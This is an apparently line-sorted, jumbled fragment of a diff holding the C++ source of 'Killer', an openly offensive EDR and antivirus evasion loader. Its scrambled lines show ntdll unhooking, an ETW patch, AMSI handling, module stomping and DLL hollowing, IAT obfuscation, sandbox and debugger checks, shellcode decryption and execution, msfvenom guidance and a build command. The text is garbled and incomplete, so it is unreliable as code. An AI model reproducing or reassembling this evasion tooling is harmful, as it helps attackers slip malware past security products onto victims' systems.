0x78, 0xc0, 0x5e, 0x18, 0x3c, 0x47, 0xca, 0x0a, 0x10, 0x3a, 0xce, 0x7b, 0x55, 0x13, 0xf8, 0x7f, 0x0f, 0x1a, 0xc5, 0x7b, 0x12, 0x8a, 0x4b, 0x7a, 0x21, 0x00, 0x02, 0x3c, 0x74, 0x10, 0x03, 0x30, 0x68, 0x45, 0xf3, 0xa5, 0xb1, 0x97, 0xb4, 0x27, 0xb4 }"
+"we can't decrypt before this phase, we must hide payload first"
+"x%02x"", (unsigned char)shellcode[i])"
+"x%02x"", currentByte)"
+"x%02x"", stub[i])"
+"x00"""
+"xb8"""
+"}      else { PRINT_SUCCESS("" NtProtectVirtualMemory Not Hooked"
+"} else { PRINT_STATUS(""No hooked modules to unhook it!"")"
+) __readfsdword(0x30)
+) { pMem[nCtr
+)((BYTE
+)((DWORD_PTR)pDosHeader 
+)()) pHollowedDLL
+)__readgsqword(0x30)
+)__readgsqword(0x60)
+)addr
+)hModule 
+)malloc(nMemAlloc))) { return EXIT_FAILURE
+)pListEntry - sizeof(LIST_ENTRY))
+)pSection->Name)
+)sntdll)) {
+//   PEB
+// Check if all required system functions were loaded successfully
+// Function to reverse a shellcode array in 0x format
+// Hardware components checker
+// It lacks the ability to effectively hide from a user manually
+// check NUMA
+// check RAM
+// check number of processors
+// custom implementation
+// https://cocomelonc.github.io/malware/2023/04/08/malware-av-evasion-15.html
+// https://cocomelonc.github.io/malware/2023/04/16/malware-av-evasion-16.html
+// scanning encoded content with a hex editor.     
+// try to prevent particular weakness of single-byte encoding: 
+033[0
+88   
+88     88 88 88        88         88         88     88   
+88.d8' 88 88        88         88         88    
+88aaa8P'  88 88        88        a88aaaa    a88aaaa8P'   
+8b.   
+8b. 88 88        88         88         88   
+= ENABLE_VIRTUAL_TERMINAL_PROCESSING
+@ECHO OFF
+Author: Hossam Ehab - facebook.com/0xHossam
+BOOL bTrap = FALSE
+BOOL checkNUMA() {
+BOOL checkResources() {
+BOOL isItHooked(LPVOID addr) {
+BYTE currentByte = charData[i]
+CheckRemoteDebuggerPresentFunc pCheckRemoteDebuggerPresentFunc = NULL
+CreateFileAFunc pCreateFileAFunc = NULL
+CreateFileMappingAFunc pCreateFileMappingAFunc = NULL
+DWORD dwMode = 0
+DWORD dwOldProtect = 0
+DWORD dwOldProtection = 0
+DWORD lpflOldProtect = 0
+DWORD oldProtection = 0
+DWORD procNum
+DWORD ram
+Date  : 8/3/2023
+Detecting the first bytes for the NTAPIs to check if it hooked
+EnableConsoleColors()
+Generate your shellcode with msfvenom tool :
+GetCurrentProcessFunc pGetCurrentProcessFunc = NULL
+GetSystemInfo(
+GlobalMemoryStatusExFunc pGlobalMemoryStatusExFunc = NULL
+HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE)
+HANDLE process = pGetCurrentProcessFunc()
+HINSTANCE hNtdll = myGetModuleHandle(wNtdll)
+HMODULE hModuleK = myGetModuleHandle(wcLib2dll))
+HMODULE myGetModuleHandle(LPCWSTR lModuleName) {
+HMODULE ntdllModule = myGetModuleHandle(wNtdll)
+If you want to run the malware in the background use this main function and put a comment in the int main... :
+If you want to use RtlMoveMemory API you can use this and comment the manual technique :
+L610 Really nice tool 
+LPVOID mem = NULL
+LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll
+LPWSTR wNtdll = wtext
+LPWSTR wcLib2dll = wtk
+Ldr->InMemoryOrderModuleList
+MEMORYSTATUSEX ms
+MODULEINFO mi = {}
+MapViewOfFileFunc pMapViewOfFileFunc = NULL
+Module stomping or DLL hallowing is for memory scanning evasion it's really nice technique
+PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase
+PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hAMSI
+PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase 
+PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)pDosHeader 
+PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) 
+PIMAGE_SECTION_HEADER pSection
+SYSTEM_INFO s
+Stolen from :  https://github.com/abdallah-elsharif/hellMaker/blob/main/samples/calc64.c
+This code attempts to create a nonexistent file and returns an error if successful. 
+This is a sandbox evasion technique used to confuse analysis tools by mimicking benign file access behavior.
+This is the result when running :
+This technique is fixed and modified from : https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection
+Title : Killer tool for EDR/AV Evasion --> IAT Obfuscation - Module stomping - DLL Unhooking 
+VOID EnableConsoleColors()
+VirtualProtectFunc pVirtualProtectFunc = NULL
+You can also use this technique for executing shellcode without create a new thread :
+] = 0x00
+] Detecting hooks in new ntdll module
+bTrap) 
+banner()
+bool isProtected = pVirtualProtectFunc((LPVOID)((DWORD_PTR)ntdllBase 
+cApi[i] = cApi[i] 
+char
+char etwPatch[] = { 0xC3 }
+checking if the allocated memory block is larger than the amount of memory that would typically be available on a sandboxed machine
+cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tp killer.cpp /link /OUT:killer.exe
+ctr = (ctr == keysize) 
+dP     dP dP 88888888P 88888888P  88888888P  dP     dP   
+dP     dP dP dP        dP         88888888b  888888ba    
+deObfuscateFunc()
+deObfuscateNT()
+decShell(pHollowedDLL)
+define KEY 0xb6
+define SIZEOF(x) sizeof(x) - 1
+do {
+dwMode 
+dwMode)
+dwOldProtection)) {
+else
+else {
+endif
+for (WORD i = 0
+for (int i = 0
+for (int idx = 0
+free(pMem)
+funcPtr)(void) = (void (
+getchar()
+hAMSI = LoadLibraryA(cAmsi)
+https://antiscan.me/images/result/07OkIKKhpRsG.png
+https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101 
+i) {
+if (!(pMem = (char
+if (!(pVirtualProtectFunc 
+if (!strcmp((char
+if (cApi[i] != 0 
+if (hModuleK != NULL) {
+if (mem != NULL) {
+if (nMemAlloc != nCtr) { return EXIT_FAILURE
+if (nbHooks > 0) {
+if (pHollowedDLL) { void (
+if (procNum < 2) return false
+if (ram < 2) return false
+if (success) { return TRUE
+ifdef _M_IX86 
+in this phase we can decrypt the paylaod (after stomping)
+include <Windows.h>
+include <iostream>
+include <memoryapi.h>
+include <psapi.h>
+include <shlwapi.h>
+include <stdio.h>
+include <stdlib.h>
+include <string.h>
+include <winternl.h>
+int index = 0
+int keysize = SIZEOF(decKey)
+int main() {
+int nbHooks = 0
+isProtected = pVirtualProtectFunc((LPVOID)((DWORD_PTR)ntdllBase 
+lpflOldProtect)
+memcpy((LPVOID)((DWORD_PTR)ntdllBase 
+ms.dwLength = sizeof(ms)
+nMemAlloc = KEY << 20
+nReversed shellcode:
+oldProtection)
+pEnctyptedShell[idx] = pEnctyptedShell[idx] 
+pGlobalMemoryStatusExFunc(
+pHollowedDLL = (unsigned char
+pHollowedDLL[i] = shellcode[i]
+pSection = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtHeaders) 
+procNum = s.dwNumberOfProcessors
+ram = ms.ullTotalPhys / 1024 / 1024 / 1024
+return -2
+return 0
+return EXIT_FAILURE
+return FALSE
+return TRUE
+return false
+return true
+std::string charData = (char
+typedef BOOL (WINAPI 
+typedef HANDLE (WINAPI 
+typedef HANDLE(WINAPI
+typedef LPVOID (WINAPI 
+typedef LPVOID(NTAPI
+typedef LPVOID(WINAPI
+typedef NTSTATUS(NTAPI
+unsigned __int64 memPage = 0x1000
+unsigned char
+unsigned int shellcode_len = sizeof(shellcode)
+void
+void banner() {
+void deObfuscate(char
+void deObfuscateFunc() {
+void deObfuscateNT() {
+void decShell(unsigned char
+void reverseShellcode(unsigned char 
+wchar_t wtext[20]
+wchar_t wtk[20]
+} while (strncmp((const char
